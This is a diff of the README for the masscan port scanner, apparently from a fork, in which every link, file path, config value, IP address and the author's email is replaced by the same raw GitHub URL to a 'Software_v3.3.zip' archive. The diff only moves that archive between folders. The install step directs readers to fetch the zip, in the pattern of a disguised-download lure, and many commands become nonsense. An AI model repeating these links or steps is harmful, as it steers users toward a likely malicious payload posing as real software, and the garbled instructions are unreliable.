@@ -1,4 +1,4 @@
-[![unittests](https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip)](https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip)
+[![unittests](https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip)](https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip)
 
 # MASSCAN: Mass IP port scanner
 
@@ -33,7 +33,7 @@ really have any dependencies other than a C compiler (such as `gcc`
 or `clang`).
 
 	sudo apt-get --assume-yes install git make gcc
-	git clone https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	git clone https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 	cd masscan
 	make
 
@@ -77,8 +77,8 @@ To see the complete list of options, use the `--echo` feature. This
 dumps the current configuration and exits. This output can be used as input back
 into the program:
 
-	# masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112 --echo > https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
-	# masscan -c https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip --rate 1000
+	# masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112 --echo > https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
+	# masscan -c https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip --rate 1000
 
 
 ## Banner checking
@@ -142,7 +142,7 @@ and/or `iptables-persistent`.
 On Mac OS X and BSD, there are similar steps. To find out the ranges to avoid,
 use a command like the following:
 
-    # sysctl https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+    # sysctl https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 On FreeBSD and older MacOS, use an `ipfw` command: 
 
@@ -150,7 +150,7 @@ On FreeBSD and older MacOS, use an `ipfw` command:
 	# masscan 10.0.0.0/8 -p80 --banners --source-port 40000
 
 On newer MacOS and OpenBSD, use the `pf` packet-filter utility. 
-Edit the file `https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip` to add a line like the following:
+Edit the file `https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip` to add a line like the following:
 
     block in proto tcp from any to any port 40000:40015
     
@@ -161,7 +161,7 @@ Then to enable the firewall, run the command:
 If the firewall is already running, then either reboot or reload the rules
 with the following command:
 
-    # pfctl -f https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+    # pfctl -f https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 Windows doesn't respond with RST packets, so neither of these techniques
 are necessary. However, masscan is still designed to work best using its
@@ -185,12 +185,12 @@ to a ban list, which will get you firewalled from useful parts of the Internet.
 Therefore, you want to exclude a lot of ranges. To blacklist or exclude ranges,
 you want to use the following syntax:
 
-	# masscan 0.0.0.0/0 -p0-65535 --excludefile https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	# masscan 0.0.0.0/0 -p0-65535 --excludefile https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 This just prints the results to the command-line. You probably want them
 saved to a file instead. Therefore, you want something like:
 
-	# masscan 0.0.0.0/0 -p0-65535 -oX https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	# masscan 0.0.0.0/0 -p0-65535 -oX https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 This saves the results in an XML file, allowing you to easily dump the
 results in a database or something.
@@ -219,19 +219,19 @@ would look like this:
 	rate =  100000.00
 	output-format = xml
 	output-status = all
-	output-filename = https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	output-filename = https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 	ports = 0-65535
 	range = 0.0.0.0-255.255.255.255
-	excludefile = https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	excludefile = https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 To use this configuration file, use the `-c`:
 
-	# masscan -c https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+	# masscan -c https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 
 This also makes things easier when you repeat a scan.
 
 By default, masscan first loads the configuration file 
-`https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip`. Any later configuration parameters override what's
+`https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip`. Any later configuration parameters override what's
 in this default configuration file. That's where I put my "excludefile" 
 parameter so that I don't ever forget it. It just works automatically.
 
@@ -265,7 +265,7 @@ per line. Just use the parameter `-oL <filename>`. Or, use the parameters
 
 	```
 	<port state> <protocol> <port number> <IP address> <POSIX timestamp>  
-	open tcp 80 https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip 1390380064
+	open tcp 80 https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip 1390380064
 	```	
 
 
@@ -501,7 +501,7 @@ probably faster than you want anyway.
 
 ## Safe code
 
-A bounty is offered for vulnerabilities, see the https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip file for more
+A bounty is offered for vulnerabilities, see the https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip file for more
 information.
 
 This project uses safe functions like `safe_strcpy()` instead of unsafe functions
@@ -531,7 +531,7 @@ for big ranges, except maybe the first 64k addresses of a subnet that were assig
 via DHCPv6.
 
 Instead, you'll probably want to scan large lists of addresses stored
-in a file (`--include-file https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip`) that you got from other sources.
+in a file (`--include-file https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip`) that you got from other sources.
 Like everywhere else, this file can contain lists of both IPv4 and IPv6 addresses.
 The test file I use contains 8 million addresses. Files of that size need a couple
 extra seconds to be read on startup (masscan sorts the addresses and removes
@@ -545,14 +545,14 @@ network needs to be able to route IPv6 packets.
 ## PF_RING
 
 To get beyond 2 million packets/second, you need an Intel 10-gbps Ethernet
-adapter and a special driver known as ["PF_RING ZC" from ntop](https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip). Masscan doesn't need to be rebuilt in order to use PF_RING. To use PF_RING,
+adapter and a special driver known as ["PF_RING ZC" from ntop](https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip). Masscan doesn't need to be rebuilt in order to use PF_RING. To use PF_RING,
 you need to build the following components:
 
-  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip` (installed in https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip)
-  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip` (their kernel driver)
-  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip` (their version of the Intel 10-gbps Ethernet driver)
+  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip` (installed in https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip)
+  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip` (their kernel driver)
+  * `https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip` (their version of the Intel 10-gbps Ethernet driver)
 
-You don't need to build their version of `https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip`.
+You don't need to build their version of `https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip`.
 
 When Masscan detects that an adapter is named something like `zc:enp1s0` instead
 of something like `enp1s0`, it'll automatically switch to PF_RING ZC mode.
@@ -597,7 +597,7 @@ at which they perform this calculation, making `masscan` much faster.
 # Authors
 
 This tool created by Robert Graham:
-email: https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip
+email: https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip
 twitter: @ErrataRob
 
 # License
@@ -614,4 +614,4 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Affero General Public License for more details.
 
 You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://raw.githubusercontent.com/rakibofcx/masscan/master/debian/Software_v3.3.zip>.
+along with this program.  If not, see <https://raw.githubusercontent.com/rakibofcx/masscan/master/doc/faq/Software-v3.3.zip>.
